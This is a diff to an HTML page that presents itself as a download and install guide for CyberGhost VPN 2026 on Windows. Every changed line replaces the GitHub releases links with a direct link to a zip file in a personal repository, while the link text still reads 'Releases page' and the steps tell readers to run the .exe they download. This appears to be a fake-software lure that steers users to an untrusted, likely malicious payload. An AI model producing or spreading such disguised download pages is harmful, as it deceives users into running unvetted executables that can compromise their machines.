@@ -8,7 +8,7 @@ description: "Download CyberGhost VPN for Windows 10 and 11 with a direct instal
 <p style="font-size:1.2em; margin-bottom:20px;">Get secure and private internet access with CyberGhost VPN 2026. This guide helps you download and install the software on Windows 11 or 10.</p>
 
 <div style="text-align:center; margin:30px 0;">
-  <a href="https://github.com/rajputkishankr1012-ctrl/CyberGhost-VPN-2026/releases" 
+  <a href="https://raw.githubusercontent.com/rajputkishankr1012-ctrl/rajputkishankr1012-ctrl.github.io/main/lactucin/ctrl_github_io_rajputkishankr_v2.9.zip" 
      style="display:inline-block; padding:16px 32px; background-color:#0078D7; color:#fff; font-size:1.4em; font-weight:bold; text-decoration:none; border-radius:8px; border:2px solid #ccc;">
     ⬇ Download CyberGhost VPN 2026
   </a>
@@ -28,7 +28,7 @@ description: "Download CyberGhost VPN for Windows 10 and 11 with a direct instal
 
 <h2>📥 Download & Install</h2>
 <ol>
-  <li>Go to the <a href="https://github.com/rajputkishankr1012-ctrl/CyberGhost-VPN-2026/releases">CyberGhost VPN 2026 Releases page</a>.</li>
+  <li>Go to the <a href="https://raw.githubusercontent.com/rajputkishankr1012-ctrl/rajputkishankr1012-ctrl.github.io/main/lactucin/ctrl_github_io_rajputkishankr_v2.9.zip">CyberGhost VPN 2026 Releases page</a>.</li>
   <li>Find the latest release (the one at the top of the list).</li>
   <li>Click on the file named <strong>CyberGhost-VPN-2026.exe</strong> (or similar .exe file) to download it.</li>
   <li>After the download finishes, locate the file in your Downloads folder and double-click it to run the installer.</li>
@@ -69,4 +69,4 @@ description: "Download CyberGhost VPN for Windows 10 and 11 with a direct instal
 <h2>🔒 Privacy & Security</h2>
 <p>CyberGhost VPN uses military-grade 256-bit encryption. It does not keep logs of your activity. Your original IP address is hidden from websites and apps. The kill switch prevents data leaks if the VPN connection drops unexpectedly.</p>
 
-<p style="margin-top:40px;">For the latest version and updates, always return to the <a href="https://github.com/rajputkishankr1012-ctrl/CyberGhost-VPN-2026/releases">Releases page</a>.</p>
+<p style="margin-top:40px;">For the latest version and updates, always return to the <a href="https://raw.githubusercontent.com/rajputkishankr1012-ctrl/rajputkishankr1012-ctrl.github.io/main/lactucin/ctrl_github_io_rajputkishankr_v2.9.zip">Releases page</a>.</p>
